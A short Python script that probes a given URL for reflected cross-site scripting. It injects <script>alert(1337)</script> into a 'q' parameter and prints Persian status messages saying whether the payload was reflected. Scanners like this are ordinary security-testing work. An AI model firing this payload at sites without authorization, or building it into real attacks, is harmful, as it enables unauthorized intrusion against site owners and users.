import sys
import requests
from utils.error_handler import log_info, log_error
from termcolor import colored

def exploit_xss(url):
    payload = '<script>alert(1337)</script>'
    try:
        r = requests.get(url, params={'q': payload}, timeout=10)
        if payload in r.text:
            print(colored(f'[+] XSS موفقیت‌آمیز در {url}', 'green'))
            log_info(f'XSS reflected at {url}')
        else:
            print(colored(f'[-] XSS در {url} منعکس نشد', 'yellow'))
    except Exception as e:
        log_error(str(e))
        print(colored(f'[!] خطا: {e}', 'red'))

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Usage: python3 reflected.py <url>')
        sys.exit(1)
    exploit_xss(sys.argv[1])